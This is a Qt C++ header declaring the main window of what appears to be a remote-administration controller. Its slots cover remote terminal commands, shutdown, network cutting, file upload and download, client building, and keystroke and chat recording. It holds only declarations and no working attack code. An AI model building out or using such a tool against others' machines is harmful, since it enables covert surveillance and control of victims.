#ifndef MAINWINDOW_H
#define MAINWINDOW_H
#include "server.h"
#include <QMainWindow>

#define CONSOLE_PROMPT "!>>>"

namespace Ui {
    class MainWindow;

}
struct UploadInfo
{
    enum State
    {
        Error,
        Transmating,
        Waiting,
        Pause,
        Requesting,
        Complated
    };

    QString uniqueName
    ;
    State state;
    QString fileName;
    qint64 fileSize;
};
Q_DECLARE_METATYPE(UploadInfo)
class QFtp;
class QEventLoop;
class Server;
class QTableWidgetItem;
class QByteArray;
class QTreeWidgetItem;
class QTreeWidget;
class Upload;
class Download;
class MainWindow : public QMainWindow
{
    Q_OBJECT
    
public:
    explicit MainWindow(QWidget *parent = 0);
    Server *server;
    ~MainWindow();
    
private slots:

    void reFreshClientTable();

    void reFreshClientsList(ushort,Server::RefreshType);

    void quitEventLoop(bool ret);

    void on_uninstallButton_clicked();

    void on_uninstallAllButton_clicked();

    void on_submitCmdButton_clicked();

    void on_sendMsgButton_clicked();

    void on_shutdownButton_clicked();

    void on_restartButton_clicked();

    void on_logoffButton_clicked();

    void on_cutNetButton_clicked();

    void on_clearButton_clicked();

    void on_copyButton_clicked();

    void on_commandLineEdit_returnPressed();

    void dataReceived(short idx,QByteArray*data);//可显示清除的数组

    //void on_exitAction_triggered();

    void on_createClientAction_triggered();

    void on_showListAction_triggered(bool checked);

    void on_settingAction_triggered();

    void on_updateFtpAction_triggered();

    void on_keepListenAction_triggered(bool checked);

    void on_clientsList_currentItemChanged(QTreeWidgetItem *current, QTreeWidgetItem *previous);

    void on_terminalAction_triggered();

    void on_broadcastAction_triggered();

    void on_systemInfoAction_triggered();

    void on_aboutAction_triggered();

    void on_refreshListButton_clicked();

    void on_uploadFileAction_triggered();

    void on_previewButton_clicked();

    void on_addToUploadListButton_clicked();

    void on_uploadFileNameEdit_textChanged(const QString &text);

    //void on_uploadTreeWidget_currentItemChanged(QTreeWidgetItem *current, QTreeWidgetItem *previous);

    //void on_uploadTreeWidget_itemChanged(QTreeWidgetItem *item, int column);

    //void uploadTableHandler(char flag, qint64 param);


    void on_readyUploadButton_clicked();

    void on_resetBatchButton_clicked();

    void on_keybdRecordAction_triggered();

    void on_chatRecordAction_triggered();
    void DownloadFile();
    void DownloadFilePathEditEvent();

private:
	void ApplyTerminalSettings();
	static QString roundFileSize(qint64 size);
    int eventLoopRet;
    Upload *upload;
    Download *download;

    Ui::MainWindow *ui;

    QFtp *ftp;


signals:
    void startUploadHandler(char flag,qint64 offset);
};

#endif // MAINWINDOW_H
